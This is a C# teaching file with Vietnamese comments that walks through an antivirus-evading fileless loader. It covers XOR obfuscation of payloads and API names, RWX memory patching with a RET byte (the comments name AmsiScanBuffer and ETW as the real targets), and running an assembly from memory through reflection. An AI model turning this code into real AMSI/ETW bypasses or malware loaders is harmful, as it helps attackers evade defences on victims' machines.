// ============================================================
// FILE: EduLoader.cs — Script giáo dục, giải thích từng bước
// Mục đích: học cách loader hoạt động, KHÔNG phải tạo malware
// Payload dùng trong ví dụ này hoàn toàn vô hại
// ============================================================

using System;
using System.IO;
using System.Text;
using System.Reflection;           // <-- dùng cho Assembly.Load, Reflection
using System.Runtime.InteropServices; // <-- dùng cho P/Invoke (gọi Windows API)

namespace EduLoader
{
    class Program
    {
        // ============================================================
        // PHẦN 1: P/INVOKE — Khai báo Windows API để dùng từ C#
        // ============================================================
        //
        // P/Invoke = cầu nối giữa C# (.NET) và Windows API (C/C++)
        //
        // [DllImport("tên_dll")] nói với C#:
        //   "Hàm này không phải tôi viết, nó nằm trong file DLL đó,
        //    hãy tìm và gọi nó khi tôi cần."
        //
        // Giống như: đặt hàng từ nhà hàng thay vì tự nấu.

        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        // LoadLibrary("amsi.dll") = mở file amsi.dll → load vào RAM process hiện tại
        // Trả về: IntPtr = địa chỉ (handle) của DLL vừa load trong RAM
        //         Giống số phòng của DLL trong tòa nhà RAM

        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        // GetProcAddress(handle_dll, "TênHàm") = tìm địa chỉ cụ thể của 1 hàm trong DLL
        // Giống: "DLL đang ở tầng 5, hàm AmsiScanBuffer ở phòng 302"
        // Trả về: địa chỉ RAM của hàm đó (dạng số nguyên)

        [DllImport("kernel32")]
        static extern bool VirtualProtect(
            IntPtr lpAddress,     // địa chỉ vùng RAM muốn đổi quyền
            UIntPtr dwSize,       // kích thước vùng (bytes)
            uint flNewProtect,    // quyền mới (xem bảng bên dưới)
            out uint lpflOldProtect); // quyền cũ (Windows lưu lại để restore sau)
        //
        // Các giá trị quyền phổ biến:
        //   0x20 = PAGE_EXECUTE_READ       (đọc + thực thi)      ← mặc định của code
        //   0x40 = PAGE_EXECUTE_READWRITE  (đọc + ghi + thực thi) ← cần để patch
        //   0x04 = PAGE_READWRITE          (chỉ đọc + ghi)
        //
        // Tại sao cần?
        //   Code trong RAM mặc định chỉ được đọc + thực thi, KHÔNG được ghi
        //   Muốn patch (ghi đè bytes) → phải đổi quyền sang có "W" (Write) trước

        // ============================================================
        // PHẦN 2: HÀM XOR — Mã hóa / giải mã đơn giản
        // ============================================================
        //
        // XOR là phép toán bit:
        //   1 XOR 1 = 0
        //   0 XOR 0 = 0
        //   1 XOR 0 = 1  ← khác nhau thì ra 1
        //   0 XOR 1 = 1
        //
        // Tính chất đặc biệt: XOR 2 lần với cùng key = ra lại bản gốc
        //   "A" XOR "K" = ký_tự_lạ
        //   ký_tự_lạ XOR "K" = "A"   ← giải mã
        //
        // Dùng để làm gì trong loader?
        //   - Mã hóa tên API ("AmsiScanBuffer") → AV static scan không thấy tên nhạy cảm
        //   - Mã hóa payload bytes → AV không nhận ra pattern malware

        static byte[] XorBytes(byte[] data, string key)
        {
            // Chuyển key string sang bytes
            // Ví dụ: key = "mykey" → bytes = {109, 121, 107, 101, 121}
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);

            byte[] result = new byte[data.Length];

            for (int i = 0; i < data.Length; i++)
            {
                // i % key.Length = lặp vòng key nếu key ngắn hơn data
                // Ví dụ: data có 10 bytes, key có 3 bytes
                //   i=0 → key[0], i=1 → key[1], i=2 → key[2]
                //   i=3 → key[0], i=4 → key[1], ... (lặp lại)
                result[i] = (byte)(data[i] ^ keyBytes[i % keyBytes.Length]);
            }

            return result;
        }

        // ============================================================
        // PHẦN 3: DEMO PATCH MEMORY (Khái niệm, không bypass thật)
        // ============================================================
        //
        // Đây là ví dụ minh họa CƠ CHẾ patch memory hoạt động thế nào.
        // Trong thực tế (DarthLoader), patch này nhắm vào AmsiScanBuffer/EtwEventWrite.
        // Ở đây ta chỉ patch 1 vùng RAM demo để học cơ chế.

        static void DemoPatchMemory()
        {
            Console.WriteLine("\n--- DEMO: Cơ chế Patch Memory ---");

            // Bước 1: Allocate vùng RAM mới có quyền Execute
            // (trong thực tế, địa chỉ của hàm API được lấy từ GetProcAddress)
            byte[] demoBytes = { 0x90, 0x90, 0x90, 0x90 }; // 4 bytes NOP (no operation)

            // Marshal.AllocHGlobal = xin Windows cấp vùng RAM
            IntPtr demoAddr = Marshal.AllocHGlobal(demoBytes.Length);

            Console.WriteLine($"[+] Địa chỉ RAM demo: 0x{demoAddr.ToInt64():X}");
            Console.WriteLine($"[+] Bytes ban đầu: {BitConverter.ToString(demoBytes)}");

            // Bước 2: Đổi quyền vùng RAM sang Read+Write+Execute (0x40)
            // → cho phép ghi vào vùng này
            VirtualProtect(demoAddr, (UIntPtr)demoBytes.Length, 0x40, out uint oldProtect);
            Console.WriteLine($"[+] Đã đổi quyền sang RWX (0x40). Quyền cũ: 0x{oldProtect:X}");

            // Bước 3: Ghi bytes mới vào vùng RAM
            // 0xC3 = lệnh RET trong x86/x64 Assembly = "return ngay lập tức"
            byte[] patchBytes = { 0xC3, 0x00, 0x00, 0x00 }; // RET + padding
            Marshal.Copy(patchBytes, 0, demoAddr, patchBytes.Length);
            Console.WriteLine($"[+] Đã ghi patch bytes: {BitConverter.ToString(patchBytes)}");
            Console.WriteLine("[+] Giải thích: 0xC3 = lệnh RET trong Assembly");
            Console.WriteLine("    Nếu đây là đầu hàm API → hàm đó giờ chỉ return ngay, không làm gì");

            // Bước 4: Restore quyền về như cũ
            VirtualProtect(demoAddr, (UIntPtr)demoBytes.Length, oldProtect, out _);
            Console.WriteLine($"[+] Đã restore quyền về: 0x{oldProtect:X}");

            // Giải phóng RAM
            Marshal.FreeHGlobal(demoAddr);
            Console.WriteLine("[+] Demo patch memory hoàn tất\n");
        }

        // ============================================================
        // PHẦN 4: LOAD ASSEMBLY TỪ RAM (Fileless Execution)
        // ============================================================
        //
        // Assembly.Load(byte[]) = load và chạy 1 chương trình .NET từ RAM
        //                         KHÔNG cần file trên ổ cứng
        //
        // Tại sao dùng?
        //   - Không có file → AV không scan được file
        //   - Payload chỉ tồn tại trong RAM
        //
        // EntryPoint = hàm Main() của chương trình được load
        // .Invoke()  = gọi hàm đó qua Reflection (không cần biết tên class)

        static void LoadAndRunFromMemory(byte[] encryptedPayload, string xorKey, string[] args)
        {
            Console.WriteLine("--- Bước 4: Load Assembly từ RAM ---");

            // Bước 4a: Giải mã XOR
            // encryptedPayload = bytes đã XOR → XOR lần 2 = ra bytes gốc
            byte[] decryptedPayload = XorBytes(encryptedPayload, xorKey);
            Console.WriteLine($"[+] Đã giải mã XOR với key: '{xorKey}'");
            Console.WriteLine($"[+] Kích thước payload: {decryptedPayload.Length} bytes");

            // Bước 4b: Load vào RAM
            // Assembly.Load(byte[]):
            //   - Nhận vào mảng bytes của file .exe/.dll
            //   - Nạp vào memory của process hiện tại
            //   - KHÔNG ghi file nào xuống disk
            //   - KHÔNG tạo process mới
            Assembly loadedAssembly = Assembly.Load(decryptedPayload);
            Console.WriteLine($"[+] Assembly.Load() thành công");
            Console.WriteLine($"[+] Tên assembly: {loadedAssembly.GetName().Name}");
            Console.WriteLine($"[+] Nằm trong RAM, không có file trên disk\n");

            // Bước 4c: Tìm và gọi hàm Main() qua Reflection
            //
            // EntryPoint = "điểm vào" của assembly = hàm Main()
            // .Invoke(null, args) = gọi hàm đó
            //   - null = không cần object (vì Main() là static)
            //   - new object[] { args } = truyền arguments vào Main(string[] args)
            MethodInfo entryPoint = loadedAssembly.EntryPoint;
            Console.WriteLine($"[+] EntryPoint (Main): {entryPoint.DeclaringType}.{entryPoint.Name}");
            Console.WriteLine("[+] Đang gọi EntryPoint.Invoke()...\n");

            entryPoint.Invoke(null, new object[] { args });
        }

        // ============================================================
        // PHẦN 5: MAIN — Kết hợp tất cả lại
        // ============================================================

        static void Main(string[] args)
        {
            Console.WriteLine("============================================");
            Console.WriteLine("  EduLoader — Script Giáo Dục Evasion");
            Console.WriteLine("============================================\n");

            // ----- BƯỚC 1: Đọc payload từ file (simulate download) -----
            //
            // Trong loader thật (DarthLoader), bước này là:
            //   WebClient.DownloadData(url) → tải từ internet
            //
            // Ở đây ta đọc từ file local để đơn giản hóa.
            // Giả sử Payload.exe đã được compile sẵn.

            Console.WriteLine("--- Bước 1: Đọc Payload ---");

            string payloadPath = "Payload.exe";
            if (!File.Exists(payloadPath))
            {
                Console.WriteLine("[!] Không tìm thấy Payload.exe");
                Console.WriteLine("[!] Hãy compile Payload.cs trước:");
                Console.WriteLine("    csc /out:Payload.exe Payload.cs");
                return;
            }

            byte[] payloadBytes = File.ReadAllBytes(payloadPath);
            Console.WriteLine($"[+] Đã đọc {payloadBytes.Length} bytes từ {payloadPath}");

            // ----- BƯỚC 2: Mã hóa XOR (simulate trạng thái "trong RAM") -----
            //
            // Trong loader thật:
            //   bytes vừa tải về → XOR encrypt ngay → lưu vào biến
            //   Mục đích: nếu AV scan RAM lúc này → thấy dữ liệu rác, không nhận ra
            //
            // Ở đây: đọc file → XOR encrypt → simulate payload "trong RAM đã mã hóa"

            Console.WriteLine("\n--- Bước 2: XOR Encrypt payload trong RAM ---");

            string xorKey = "hoc-evasion-2024"; // key mã hóa
            byte[] encryptedPayload = XorBytes(payloadBytes, xorKey);

            Console.WriteLine($"[+] XOR key: '{xorKey}'");
            Console.WriteLine($"[+] 4 bytes đầu gốc:    {BitConverter.ToString(payloadBytes, 0, 4)}");
            Console.WriteLine($"[+] 4 bytes đầu mã hóa: {BitConverter.ToString(encryptedPayload, 0, 4)}");
            Console.WriteLine("[+] Payload trong RAM giờ trông như dữ liệu rác");

            // ----- BƯỚC 3: Demo Patch Memory (giáo dục) -----
            //
            // Giải thích cơ chế VirtualProtect + Marshal.Copy
            // KHÔNG patch AmsiScanBuffer/ETW thật trong script này

            DemoPatchMemory();

            // ----- BƯỚC 4: Giải mã + Load + Chạy từ RAM -----
            //
            // Đây là bước quan trọng nhất:
            //   XOR decrypt → Assembly.Load → EntryPoint.Invoke
            //   Toàn bộ diễn ra trong RAM, không có file mới nào được tạo

            LoadAndRunFromMemory(encryptedPayload, xorKey, new string[] { "hello-from-loader" });

            Console.WriteLine("\n============================================");
            Console.WriteLine("  Hoàn tất. Tóm tắt những gì đã diễn ra:");
            Console.WriteLine("============================================");
            Console.WriteLine("1. Đọc Payload.exe → byte array trong RAM");
            Console.WriteLine("2. XOR encrypt bytes → không nhận ra được trong RAM");
            Console.WriteLine("3. Demo VirtualProtect + Marshal.Copy (cơ chế patch)");
            Console.WriteLine("4. XOR decrypt → Assembly.Load(bytes) → chạy trong RAM");
            Console.WriteLine("   Không có file nào được tạo thêm trên ổ cứng.");
            Console.WriteLine("============================================");
        }
    }
}

// ============================================================
// CÁCH CHẠY:
//
// 1. Compile Payload trước:
//    csc /out:Payload.exe Payload.cs
//
// 2. Compile EduLoader:
//    csc /out:EduLoader.exe EduLoader.cs
//
// 3. Chạy:
//    EduLoader.exe
//
// KẾT QUẢ MONG ĐỢI:
//   [+] Đã đọc XXXX bytes từ Payload.exe
//   [+] XOR key: 'hoc-evasion-2024'
//   [+] 4 bytes đầu gốc:    4D-5A-90-00   ← "MZ" = header của file .exe
//   [+] 4 bytes đầu mã hóa: XX-XX-XX-XX   ← bytes rác sau XOR
//   ...
//   [Payload] Xin chào! Tôi đang chạy trong RAM.
//   [Payload] Không có file nào được tạo trên ổ cứng.
//   [Payload] Nhận được argument: hello-from-loader
// ============================================================
